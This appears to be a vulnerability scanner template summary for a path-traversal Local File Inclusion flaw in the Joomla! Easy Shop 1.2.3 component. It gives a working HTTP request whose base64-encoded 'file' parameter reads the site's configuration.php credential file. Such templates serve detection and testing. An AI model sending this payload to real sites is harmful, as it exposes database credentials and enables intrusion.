# Nuclei Template: Joomla! Component Easy Shop 1.2.3 - Local File Inclusion
**Template ID:** joomla-easyshop-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`joomla-easyshop-lfi.yaml`)

## Vulnerability Information & PoC

## Description
The Joomla! component Easy Shop version 1.2.3 is vulnerable to Local File Inclusion (LFI) attacks.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/index.php?option=com_easyshop&task=ajax.loadImage&file=Li4vLi4vY29uZmlndXJhdGlvbi5waHA=
```

## References
- https://blog.csdn.net/weixin_42628854/article/details/136036109
